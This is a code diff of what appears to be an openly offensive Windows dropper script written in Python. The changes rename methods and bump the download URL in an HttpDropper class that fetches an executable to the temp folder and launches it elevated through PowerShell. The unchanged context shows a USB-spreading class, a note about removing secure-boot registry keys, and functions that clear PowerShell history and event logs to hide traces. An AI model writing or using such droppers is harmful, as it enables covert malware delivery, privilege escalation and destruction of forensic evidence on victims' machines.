@@ -108,7 +108,6 @@ def Payload():
     #-DevNote- Remove the safeboot/secureboot reg key.
 
 class UsbDropper:
-    
     def __init__(self):
         self.DRIVELETTERS = ["A:", "B:", "C:", "D:", "E:", "F:", "G:", "H:", "I:", "J:", "K:", "L:", "M:", "N:", "O:", "P:", "Q:", "R:", "S:", "T:", "U:", "V:", "W:", "Y:", "X:", "Z:"]
         self.CURRENTHOMEDRIVE = environ["HomeDrive"] #-Returns HomeDrive windows-10 environment variable
@@ -133,16 +132,15 @@ class UsbDropper:
                 pass
             
 class HttpDropper:
-    
     def __init__(self):
-        self.nameoftheexecutable = "python-3.11.2-amd64.exe" #-The full name of the executable you are trying to download must go here
-        self.url = "https://www.python.org/ftp/python/3.11.2/"+self.nameoftheexecutable #-The download url must go here excluding the filename
+        self.nameoftheexecutable = "python-3.11.3-amd64.exe" #-The full name of the executable you are trying to download must go here
+        self.url = "https://www.python.org/ftp/python/3.11.3/"+self.nameoftheexecutable #-The download url must go here excluding the filename
         self.downloadpath = environ["temp"]
 
-    def dropper(self):
+    def Dropper(self):
         urlretrieve(self.url, r""+self.downloadpath+"/"+self.nameoftheexecutable)
 
-    def executor(self):
+    def Executor(self):
         run("powershell.exe Start-Process "+self.downloadpath+"/"+self.nameoftheexecutable+" -Verb runAs", shell = True)
 
 def ClearPsCommandHistory():
@@ -176,7 +174,7 @@ def main():
 
     HTTPDROPPER = HttpDropper()
 
-    HTTPDROPPER.dropper(), HTTPDROPPER.executor()
+    HTTPDROPPER.Dropper(), HTTPDROPPER.Executor()
             
     ClearPsCommandHistory(), ClearingEventViewer()
 
